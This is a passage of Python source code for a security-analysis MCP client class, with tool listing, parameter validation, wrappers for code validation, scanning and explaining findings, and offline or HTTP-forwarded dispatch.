    # ── Public API ──────────────────────────────────────────────────

    def list_tools(self) -> list[dict[str, Any]]:
        """Return metadata for all 8 MCP tools.

        Returns:
            List of tool-description dictionaries, each containing
            ``name``, ``description``, and ``input_schema`` keys.

        Example::

            >>> tools = mcp.list_tools()
            >>> print(tools[0]["name"])
            validate_code
            >>> print(len(tools))
            8
        """
        self.logger.debug("Listing %d MCP tools", len(_TOOL_SCHEMAS))
        return [dict(t) for t in _TOOL_SCHEMAS]

    def call_tool(self, name: str, params: dict[str, Any]) -> dict[str, Any]:
        """Invoke an MCP tool by name with the given parameters.

        The call is dispatched to the online MCP server when an endpoint
        is configured; otherwise the offline (local) implementation is
        used.

        Args:
            name: Tool name — one of the eight supported names.
            params: Tool-specific parameters (validated against schema).

        Returns:
            Tool result dictionary.

        Raises:
            ValidationError: If *name* is not a recognised tool or if
                required parameters are missing.

        Example::

            >>> result = mcp.call_tool("validate_code", {
            ...     "language": "python",
            ...     "source": "print('hello')",
            ... })
            >>> print(result["status"])
            ok
        """
        if name not in _TOOL_MAP:
            raise ValidationError(
                f"Unknown MCP tool: {name!r}. "
                f"Available tools: {', '.join(_TOOL_NAMES)}"
            )

        # Validate required parameters
        schema = _TOOL_MAP[name]["input_schema"]
        required = schema.get("required", [])
        missing = [r for r in required if r not in params]
        if missing:
            raise ValidationError(
                f"Missing required parameters for tool {name!r}: {missing}"
            )

        self.logger.debug("Calling MCP tool: %s (params keys=%s)", name, list(params.keys()))

        if self._endpoint:
            return self._call_online(name, params)
        return self._call_offline(name, params)

    def validate(self, language: str, source: str, strict: bool = False) -> dict[str, Any]:
        """Validate source code via the ``validate_code`` MCP tool.

        Convenience wrapper around :meth:`call_tool`.

        Args:
            language: Programming language of the source code.
            source: Source code to validate.
            strict: When ``True``, fail on style warnings as well as errors.

        Returns:
            Validation result dictionary.

        Example::

            >>> result = mcp.validate("python", "x = eval(input())")
            >>> print(result["status"])
            error
        """
        return self.call_tool("validate_code", {
            "language": language,
            "source": source,
            "strict": strict,
        })

    def scan(self, target: str, depth: int = 1, rules: Optional[list[str]] = None) -> dict[str, Any]:
        """Scan a target via the ``scan_target`` MCP tool.

        Convenience wrapper around :meth:`call_tool`.

        Args:
            target: File path, directory, or URL to scan.
            depth: Recursion depth for directory scans.
            rules: Optional rule IDs to include.

        Returns:
            Scan result dictionary.

        Example::

            >>> result = mcp.scan("/path/to/code", depth=2)
            >>> print(result["grade"])
            A
        """
        params: dict[str, Any] = {"target": target, "depth": depth}
        if rules:
            params["rules"] = rules
        return self.call_tool("scan_target", params)

    def explain(self, finding: dict[str, Any], detail_level: str = "standard") -> str:
        """Explain a security finding via the ``explain_finding`` MCP tool.

        Convenience wrapper that returns the explanation string directly
        instead of the full result dictionary.

        Args:
            finding: Security finding dictionary (must contain at least a
                ``title`` key).
            detail_level: Verbosity — ``"brief"``, ``"standard"``, or
                ``"detailed"``.

        Returns:
            Human-readable explanation string.

        Example::

            >>> explanation = mcp.explain({
            ...     "title": "SQL Injection",
            ...     "severity": "critical",
            ...     "category": "injection",
            ... })
            >>> print(explanation[:50])
            ## SQL Injection
        """
        result = self.call_tool("explain_finding", {
            "finding": finding,
            "detail_level": detail_level,
        })
        return result.get("explanation", "No explanation generated.")

    def capabilities(self) -> list[str]:
        """Return the list of capabilities this module provides.

        Returns:
            Alphabetically-sorted list of capability strings.
        """
        return sorted(self.CAPABILITIES)

    # ── Private dispatch ────────────────────────────────────────────

    def _call_offline(self, name: str, params: dict[str, Any]) -> dict[str, Any]:
        """Execute a tool using the offline (local) implementation.

        Args:
            name: Tool name.
            params: Tool parameters.

        Returns:
            Tool result dictionary.
        """
        self.logger.debug("Executing offline: %s", name)
        handler = _OFFLINE_HANDLERS[name]
        start = time.perf_counter_ns()
        result = handler(params)
        elapsed_ms = (time.perf_counter_ns() - start) // 1_000_000
        result["_meta"] = {
            "mode": "offline",
            "tool": name,
            "elapsed_ms": elapsed_ms,
        }
        self.logger.debug("Offline execution of %s completed in %d ms", name, elapsed_ms)
        return result

    def _call_online(self, name: str, params: dict[str, Any]) -> dict[str, Any]:
        """Execute a tool by forwarding to the remote MCP server.

        Args:
            name: Tool name.
            params: Tool parameters.

        Returns:
            Tool result dictionary.

        Raises:
            ConfigurationError: If the online call fails.
        """
        if not self._endpoint:
            raise ConfigurationError("MCP endpoint is not configured.")

        self.logger.debug("Forwarding to MCP server: %s tool=%s", self._endpoint, name)

        url = f"{self._endpoint.rstrip('/')}/tools/{name}"
        payload = json.dumps(params).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

        # Add API key if available
        api_key = getattr(self.config, "api_key", None)
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"

        request = urllib.request.Request(
            url,
            data=payload,
            headers=headers,
            method="POST",
        )

        try:
            with urllib.request.urlopen(request, timeout=self._timeout_ms / 1000) as response:
                raw = json.loads(response.read().decode("utf-8"))
                raw["_meta"] = {
                    "mode": "online",
                    "tool": name,
                    "endpoint": self._endpoint,
                }
                self.logger.debug("Online call to %s completed successfully", name)
                return raw
        except urllib.error.HTTPError as exc:
            self.logger.error("MCP HTTP error %s: %s", exc.code, exc.reason)
            raise ConfigurationError(
                f"MCP server returned HTTP {exc.code}: {exc.reason}"
            ) from exc
        except urllib.error.URLError as exc:
            self.logger.error("MCP connection error: %s", exc.reason)
            raise ConfigurationError(
                f"Cannot reach MCP server at {self._endpoint}: {exc.reason}"
            ) from exc
        except json.JSONDecodeError as exc:
            self.logger.error("MCP returned invalid JSON: %s", exc)
            raise ConfigurationError("MCP server returned invalid JSON response") from exc
